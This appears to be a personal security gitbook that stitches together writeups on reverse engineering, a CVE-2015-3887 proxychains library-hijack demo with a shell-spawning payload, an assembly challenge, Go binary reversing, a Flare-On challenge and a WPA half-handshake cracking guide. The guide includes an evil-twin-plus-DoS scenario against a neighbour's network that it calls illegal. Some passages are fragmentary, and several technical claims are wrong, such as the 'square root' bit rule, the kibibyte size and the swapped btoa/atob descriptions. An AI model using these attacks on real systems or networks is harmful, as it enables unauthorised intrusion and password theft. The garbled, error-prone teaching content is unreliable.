<p><strong>First things first, welcome in my gitbook !</strong></p>
<p>I decided to make a mdbook so i can share writeups and exploits i found throughout time more easily online...</p>
<p>Hopefully you will enjoy it as much as i did enjoy making the page :)</p>
<p><strong>Time for Explanations !</strong>  Let's start with what is Reverse Engineering</p>
<h1 id="what-is-reverse-engineering-"><a class="header" href="#what-is-reverse-engineering-">What is Reverse Engineering ?</a></h1>
<p>To get a good definition of what is really Reverse Engineering i wen't on Wikipedia... Yeah i know pretty lame.</p>
<p><strong>Reverse engineering</strong> (also known as backwards engineering or back engineering) is a process or method through the application of which one attempts to <strong>understand through deductive reasoning how a device, process, system, or piece of software accomplishes a task with very little (if any) insight into exactly how it does so.</strong></p>
<p>In our case, we're <strong>Reverse Engineering programs (Binary Executables)</strong>, to do that we're using <strong>Decompilers, Debuggers, Disas, Hex Editors, PE Structure Analysis Tools and many more...</strong> note that you can reverse pretty much anything that has been engineered in the first place.</p>
<p><img src="https://c.tenor.com/K8R7LThju04AAAAC/hack-the-planet.gif" alt="alt" /></p>
<h1 id="why-reverse-engineering"><a class="header" href="#why-reverse-engineering">Why Reverse Engineering</a></h1>
<p>If you're into programming, Reverse Engineering might be one of the most important skills to improve your programming knowledge.</p>
<p>Looking at other people code was always one of the best, if not the best way to learn new programming techniques. Now we all know that C and C++ Programs goes through a big process (Preprocessing, Tokenization, Optimizations, Assembling, Linking,...) that basically change the textual code into a binary executable for the Operating System you want.</p>
<p><img src="https://files.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-Mk7MCiXZ7za0yxyehCg%2F-Mk7RfLlphCqkUO3SrCj%2F-Mk7Rv7gIyuteAZiRR4v%2Fimage.png?alt=media&amp;token=a8fa223b-1f37-4781-b07d-f7b42dfb80c1" alt="alt" /></p>
<p>Binary is a LOT more harder to understand and only a few binary ninjas are able to understand it, so unless the program is open-source you will potentially need to disassemble or decompile the binary, this is called Reverse Engineering, we take a compile executable (or binary), and we try to understand the code through either :</p>
<ul>
<li>
<p>Disassembly</p>
<ul>
<li>Disassembly is the act of disassembling an executable or binary into it's assembly representation, the disassembling process can't be 100% perfect and they might be some errors to fixed in the disassembled code.</li>
</ul>
</li>
<li>
<p>Decompiling</p>
<ul>
<li>Decompilation is the act of decompiling, we basically take a compiled binary and we tried to reverse that process to obtain a C / C++ representation of the binary or executable your currently analysing.</li>
</ul>
</li>
</ul>
<p>Knowing how to reverse a program will allow you to take any executable you want and look at what it does and how it truly does it things behind the scene.</p>
<p>Also Reverse Engineering, is useful for Malware Analysis, malwares uses a lot of different Obfuscation techniques, to make your life harder as an analyst, knowing how to counter these techniques and how to Deobfuscate programs will highly help you as a programmer.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cve-2015-3887"><a class="header" href="#cve-2015-3887">CVE-2015-3887</a></h1>
<p>CVE-2015-3887,... we are dealing with a quite old exploit this time, but i wanted to take a look at the proxychains source code, to gain more programming knowledge.</p>
<p>After looking for a bit, i saw a <code>#define SUPER_SECURE</code> with a comment next to it saying &quot;<strong>CVE-2015-3887</strong>&quot;, so i decided to look, and it seemed like a pretty cool exploit to me.</p>
<h2 id="explanations"><a class="header" href="#explanations">Explanations</a></h2>
<p>The exploit is fairly simple and straight forward, the program looks for <code>libproxychains4.so</code> in the <strong>Current Path</strong> of the program instead of looking in the default <strong>libproxychains4.so</strong> directory which is in <strong>/usr/local/lib/libproxychains4.so</strong>...</p>
<p>This means we can write any code we wan't on our target machine, compile the code into a shared object using the following flags, in the following example i compile a file called <strong>payload.c</strong> into a <strong>libproxychains4.so</strong> :</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<p>Next we would need to put the compiled file into the same directory where the <strong>proxychains</strong> binary is being ran from (<code>which proxychains</code> or <code>which proxychains4</code>).</p>
<h2 id="exploit-demo"><a class="header" href="#exploit-demo">Exploit demo</a></h2>
<ol>
<li>Compile the program <strong>with the ignore_cve flag on</strong>, so the program is vulnerable.</li>
</ol>
<pre><code class="language-bash">$ git clone https://github.com/rofl0r/proxychains-ng
$ cd proxychains-ng
$ vim configure (or nano if you prefer)

# find the &quot;ignore_cve&quot; field, and change it to &quot;yes&quot; (without quote marks), save and close the editor.

$ vim Makefile
$ :%/$(exec_prefix)/.
$ :%/$(prefix)/.        

# These 2 last commands will change every &quot;$(prefix)&quot; and &quot;$(exec_prefix)&quot; with &quot;.&quot;, since we only want to build proxychains in our current directory.

$ ./configure
$ make &amp;&amp; make install

# you should now have a compiled version of proxychains4 in the project directory (proxychains4-ng).
</code></pre>
<ol start="2">
<li>Write and Compile the exploit</li>
</ol>
<p>We're going to do things pretty simply, we are first going to look at libproxychains4 functions and see which one we can potentially hijack.</p>
<p>After looking for a minute i see the socket function, i am 100% sure the program will use this function in his runtime so i will hijack this one.</p>
<p>Let's write the exploit :)</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int socket(){
    system(&quot;/bin/bash&quot;);
    return 0;
}

</code></pre>
<p>Let's compile the exploit as a shared object</p>
<p><code>gcc -shared -nostdlib -o libproxychains4.so payload.c</code></p>
<ol start="3">
<li>Bypass the default libproxychains4.so using our exploit</li>
</ol>
<p>Just put the newly compiled file inside the same directory as the proxychains binary, make sure the name of the shared object is <strong>libproxychains4.so</strong> and you should get a shell...</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="embryoasm-level-6"><a class="header" href="#embryoasm-level-6">EmbryoASM Level 6</a></h1>
<p>So this challenge is a little bit harder since we need to compute the modulo of rdi with 256 and rsi with 65536 using only
MOV instructions.</p>
<p>Since i am nowhere near being a shifting, rotating and masking or mathematic wizard, i was struggling at the beginning of this challenge. But thanks to Kanak on discord, he showed us on video a little more how we were supposed to complete the challenge and everything start making sense for me.</p>
<h2 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h2>
<p>Basically the program asks us to modulo with 256 and 65536, note that :</p>
<pre><code>- 4 is the biggest value 2 bits can address.
- 16 is the biggest value 4 bits can address.
- 256 is the biggest value 8 bits can address.
- 65536 is the biggest value 16 bits can address.
</code></pre>
<p>When we talk about modulo, we always think about division and the remainder of it.</p>
<p>But there's something special about modulo with 4, 16, 256, 65536,... :</p>
<pre><code>- When we do modulo with 4 we're basically asking for the last 2 bits of that number (Square root of 4).
- When we do modulo with 16 we're basically asking for the last 4 bits of that number (Square root of 16).
- When we do modulo with 256 we're basically asking for only the last 8 bits of that number (Square root of 256).
- When we modulo with 65536 we're basically asking for only the last 16 bits of that number (Square root of 65536).
</code></pre>
<p>Examples:</p>
<pre><code>   9382 % 4 = 2         &lt;= Here we access the last 2 bits
   9382 % 16 = 6       &lt;= Here we access the last 4 bits
   9382 % 256 = 166     &lt;= Here we access the last 8 bits
   9382 % 65536 = 9382  &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  2019249 % 4 = 1        &lt;= Here we access the last 2 bits
  2019249 % 16 = 1      &lt;= Here we access the last 4 bits
  2019249 % 256 = 177    &lt;= Here we access the last 8 bits
  2019249 % 65536 = 53169 &lt;= Here we access the last 16 bits
</code></pre>
<pre><code>  0x12345678 % 4 = 0
  0x12345678 % 16 = 0x8
  0x12345678 % 256 = 0x78
  0x12345678 % 65536 = 0x5678
  0x12345678 % 4294967296 = 0x12345678

  It is sometimes easier to see the pattern using hexadecimal characters.
</code></pre>
<p>But since we can't use division on the challenge we need to know how to compute modulo a different way...</p>
<p>After a bit of research i stumbled across this post on stackoverflow where someone was asking different ways to modulo a certain value, i read that these operations are the same :</p>
<pre><code>    9382 % 4 = 2
    9382 &amp; (4 - 1) = 2        &lt;= Same as the precedent operation

    9382 % 16 = 6
    9382 &amp; (16 - 1) = 6       &lt;= Same as the precedent operation

    9382 % 256 = 166
    9382 &amp; (256 - 1) = 166    &lt;= Same as the precedent operation

    9382 % 65536 = 9382
    9382 &amp; (65536 - 1) = 9382 &lt;= Same as the precedent operation
</code></pre>
<pre><code>    0x12345678 % 16 = 0x8
    0x12345678 &amp; (16 - 1) = 0x8

    0x12345678 % 256 = 0x78
    0x12345678 &amp; (256 - 1) = 0x78
    
    0x12345678 % 65536 = 0x5678
    0x12345678 &amp; (65536 - 1) = 0x5678

    0x12345678 % 4294967296 = 0x12345678
    0x12345678 &amp; (4294967296 - 1) = 0x12345678
</code></pre>
<p>What we're doing is basically <em>masking</em> a number by <strong>AND'ing</strong> with (2 ** n bits we want to access - 1) and this does the same result as doing modulo on (2 ** n bits we want to access).</p>

<li>It also introduces a set of pseudo registers (that you might not have seen before).</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<ul>
<li><strong>Go Tool Objdump</strong>
You can use <strong>objdump</strong> along with <strong>go tool</strong> to dump binary informations (functions, sections,...) </li>
</ul>
<p>You would typically use it the following way.</p>
<pre><code>$ go tool objdump -s &lt;func&gt; &lt;bin&gt; 
$ go tool objdump &lt;arguments&gt; &lt;bin&gt;
</code></pre>
<p>A big advantage of using <strong>go tool objdump</strong> is that you get line numbers in code.This can help you group instructions by operations.</p>
<p><em>Note that pretty much every disassembler does a great job at disassembling go binaries, this includes (r2, ghidra, ida, cutter, binary ninja, hopper, gdb,...).</em></p>
<p><em>Usually it is a best practice to use as many disassembler as you can and compare and catch on differences in the output, i usually like ghidra + ida or ida + binary ninja</em></p>
<h2 id="default-protections-on-go-binaries"><a class="header" href="#default-protections-on-go-binaries">Default Protections on Go Binaries</a></h2>
<p>When you run go build, it should enable <strong>NX</strong> <em>(or No Execute if you prefer)</em> by default on the resulting binary. </p>
<p>However note that <strong>Position Independent Code (PIC or PIE) and Stack Canaries</strong> are usually disabled <strong>by default</strong>, also note that binaries are not stripped.</p>
<p>ROP are a lot easier on go binaries since <strong>PIC (or PIE)</strong> is disabled by default.</p>
<h4 id="how-to-enable-protections-on-go-binaries"><a class="header" href="#how-to-enable-protections-on-go-binaries">How to enable protections on Go binaries.</a></h4>
<ul>
<li>Enable Stack Protections <code>export CGO_LDFLAGS='-fstack-protector'</code></li>
<li>Strip the binary <code>GOOS=linux go build -ldflags=&quot;-s -w&quot;</code></li>
<li>Enable PIE <code>export GOFLAGS='-buildmode=pie'</code></li>
<li>Strip functions names and reduce size <code>Get UPX and pack the file</code></li>
</ul>
<h2 id="searching-for-strings"><a class="header" href="#searching-for-strings">Searching for Strings</a></h2>
<p>Searching for strings in a go binary is a little harder than usual, because they are clumped together in a massive string table.</p>
<ul>
<li>Go does not store null terminated strings.</li>
<li>Strings are clumped together, while keeping a separate table with length information.</li>
<li>This can make it difficult to look for string cross-references.</li>
<li>We can use a project like <a href="https://github.com/carvesystems/gostringsr2">gostringsr2</a> to parse strings.</li>
<li>When working with MachO binaries, you'd have to list strings from .rodata or entire binary</li>
</ul>
<p>The usage of <strong>grep</strong> or filters is basically a must when looking at a go binary strings, because finding yourself in this massive string table can be quite hard.</p>
<p><strong>rabin2</strong>
rabin2 is very useful when looking at go strings and is absolutely straightforward to use.</p>
<pre><code>rabin2 -zz &lt;binary&gt; | grep &lt;char.sequence&gt;
</code></pre>
<p><em>Just like with disassemblers, always use 2-3 different program when looking at strings and check for any differences, it might be hard to see with go binaries since they are statically linked, therefore all library strings should also be in the string table by default.</em></p>
<h2 id="searching-for-functions"><a class="header" href="#searching-for-functions">Searching for functions</a></h2>
<p>Searching for functions is a lot easier than searching for strings in go binaries, which is the opposite of usual C/C++ binaries where strings are by default easier to find than functions.</p>
<p>Most of the time, even <strong>stripped</strong>, functions are still easy to find in go binaries, which is awesome to us anal-ysts.</p>
<h2 id="finding-the-main-function"><a class="header" href="#finding-the-main-function">Finding the main function</a></h2>
<p>Finding the main function is the easiest to find in go binaries, even in stripped ones... to find the main function look for either <strong>main.main or main_main</strong>.</p>
<h2 id="go-stacks"><a class="header" href="#go-stacks">Go Stacks</a></h2>
<p>An important thing to know about Go binaries is that they handle stacks differently, here's the main difference.</p>
<ul>
<li>Go routines have small stacks by default (2 kibibyte = 1024 bytes stack)</li>
<li>Many goroutines will call <strong>morestack</strong> (sym.runtime.morestack_noctxt), to grow the stack (in powers of 2) as needed using stack copying.</li>
<li>This is called because go can't be sure the function will outgrow the stack (i.e recursive functions) given non-deterministic goroutines.</li>
<li>When this occurs, stack grows, pointers in the stack are updated.</li>
<li>Additionally, each function compares its stack pointer against <strong>g-&gt;stackguard</strong> to check for overflow.</li>
<li>Go uses 8 byte alignment on stack.</li>
</ul>
<h2 id="conventions-arguments-and-return-values"><a class="header" href="#conventions-arguments-and-return-values">Conventions (Arguments and Return Values)</a></h2>
<p>Go binaries places return values on the stack, as opposed to C where return values are placed in registers (usually eax for x86).</p>
<p>As for return values, function arguments are also placed on the stack rather than registers.</p>
<p><em>Understanding go internal libraries can significantly help us understand what is going on in the assembly code. Read the Go Docs !</em></p>
<h2 id="go-error-handling"><a class="header" href="#go-error-handling">Go Error Handling</a></h2>
<ul>
<li><strong>error</strong> is an interface.</li>
<li>Error handling is clumsy in go.</li>
<li>Bugs due to unhandled errors are common.</li>
<li>When checking for <strong>error != nil</strong> we load the error vtable and error value.</li>
<li>Then we test if the value is nil.</li>
<li>And branch depending on the result.</li>
</ul>

<p>Credchecker is the first challenge of the Flare-On 8 (2021) CTF Event and it was super easy to complete.</p>
<h2 id="the-challenge"><a class="header" href="#the-challenge">The Challenge</a></h2>
<p>We are given a <strong>admin.html</strong> file (which is the challenge meat), and a <strong>img</strong> directory containing an image (not important to us).</p>
<p>I first start a <strong>PHP Web Server</strong> using the following command
<code>php -S 127.0.0.1:6969</code></p>
<p>Then i can access the challenge using my browser at the following URL <strong>127.0.0.1:6969</strong>, let's see what the challenge page looks like in the first place.</p>
<p><img src="https://i.imgur.com/CXojMs8.png" alt="admin.html" /></p>
<h2 id="source-code"><a class="header" href="#source-code">Source Code</a></h2>
<p>To solve the challenge we need to look at the javascript code inside the <strong>admin.html</strong> file.</p>
<p>Whenever the button is pressed, the <strong>checkCreds()</strong> javascript function gets called.</p>
<p><img src="https://i.imgur.com/NVGdHtC.png" alt="button" /></p>
<p>Let's find this <strong>checkCreds()</strong> function.</p>
<p><img src="https://i.imgur.com/Y4OnfT7.png" alt="checkCreds" /></p>
<p>We're basically checking if <strong>btoa(ourInput)</strong> is equal to <strong>goldenticket</strong>, the <strong>btoa</strong> function takes a base64 string and decodes it.</p>
<p>We can assume that the password is the the base64 encoded verson of <strong>goldenticket</strong>, or <strong>atob(&quot;goldenticket&quot;)</strong> should also print you the password, the <strong>atob</strong> function takes an ascii string and encode it into base64.</p>
<p>Let's prove the password works...</p>

<div style="break-before: page; page-break-before: always;"></div><h1 id="half-handshake-crack"><a class="header" href="#half-handshake-crack">Half-Handshake Crack</a></h1>
<p>Sometimes when waiting for handshakes you will catch only the half part of that handshake, that is without the handshake being acknowledged by the network in question.
Know that those handshakes can be extremely useful in certain scenarios.</p>
<p>When listening for handshakes in public places, you will often see half handshakes popped up in your capture file (or wireshark, or whatever you use). These handshakes are as much crackable as full three-way handshakes, thing is you can't know for sure if the password is right since half-handshake aren't acknowledge by the router.</p>
<p>You can capture Half Handshake pretty easily, first you need an adapter that his compatible with the aircrack-ng suite, here's a small list of chipset compatible with aicrack.</p>
<ul>
<li>Ralink RT8070, RT3070</li>
<li>Ralink RT2770, RT2750</li>
<li>Ralink RT3572, RT5572</li>
<li>Ralink RT5370N</li>
<li>Realtek RTL8812AU</li>
<li>Atheros AR9002U</li>
<li>Realtek RTL8188SU</li>
<li>Realtek RTL8192EU</li>
<li>Atheros AR9271</li>
</ul>
<p>Next thing to do is to install the right drivers for the adapter your going to use, i use Atheros AR9002U (TN-WN722N) and RTL8812AU (AWUS036ACH), so i installed the following drivers to get started.</p>
<pre><code>$ git clone https://github.com/aircrack-ng/rtl8188eus
$ git clone https://github.com/aircrack-ng/rtl8812au
</code></pre>
<p>Then you should be ready to go, enable monitor mode (don't forget to change your mac address <em>wink wink</em>), start airodump.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt;
</code></pre>
<p>Find a target network (make sure you have the right to crack it), and note the channel the network is currently using. Now let's start the real things, we are going to want to see what's going on in the airodump capture for this reason we'll manually capture the handshake with wireshark instead of using the airodump --write switch.</p>
<pre><code>$ sudo airodump-ng &lt;device&gt; -c &lt;network channel&gt; &amp; wireshark
</code></pre>
<p>Open the wireshark window, and double click on the interface your currently listening on with airodump, now you can copy the BSSID of your target network and we'll use a filter inside wireshark so we will see only the packets addressed to this network.</p>
<pre><code>Wireshark BSSID Filter : wlan.ta == &lt;bssid&gt; || wlan.da == &lt;bssid&gt;
Handshake filter : eapol &amp;&amp; wlan.da == &lt;bssid&gt; || eapol &amp;&amp; wlan.ta == &lt;bssid&gt;
</code></pre>
<p>Now you can wait until someone tries to connect to the network with a password, you should capture EAPOL packets when the key reach <strong>Message 2 of 4</strong>, you know you have your half handshake.</p>
<h2 id="social-engineering-scenario"><a class="header" href="#social-engineering-scenario">Social Engineering Scenario</a></h2>
<p>Okay let's go a little deeper because half-handshakes can be used in a tons of different scenario, but in this section we'll explore one. </p>
<p>So here it is, you are currently in your home and you want to hack into your neighbor's wifi (totally unethical and illegal), but you can't seem to get any handshake out of their network, what you could do is make an Evil Access Point that looks exactly like your target network (same name, bssid) and put some random password on this network, you will also launch a ddos attack agains't the target network so that the victim can't connect to his real network. Now your neighbor get's home after a long day of work, he see's that he his disconnected from the network so he tries to connect to it, prompt is usual password and he see's that it doesn't work. </p>
<p>At this point you should have catched at least a handshake or even more that you can crack, it's time to stop the attack and allow your poor neighbor to connect back again to it's network.</p>
<p>Check on wireshark using the <strong>eapol</strong> filter or the Handshake filter i shown a little earlier, if you have eapol packets with &quot;Key (Message 2 of 4)&quot; this means you successfully captured your half-handshake. Save the capture to a .pcap file and we can go to the next step.</p>
<h2 id="time-to-crack"><a class="header" href="#time-to-crack">Time to crack</a></h2>
<p>Now you have successfully gotten your hands on your handshake it's time to crack it. For this, you can use either a predefined wordlist (works sometimes), or if you know the target you could build one based on your target, in this case i will show you using a predefined wordlist <strong>rockyou.txt</strong>, the command is the same as usual but i will still show it.</p>
<pre><code>aircrack-ng -w /usr/share/wordlists/rockyou.txt &lt;capture file&gt;
</code></pre>
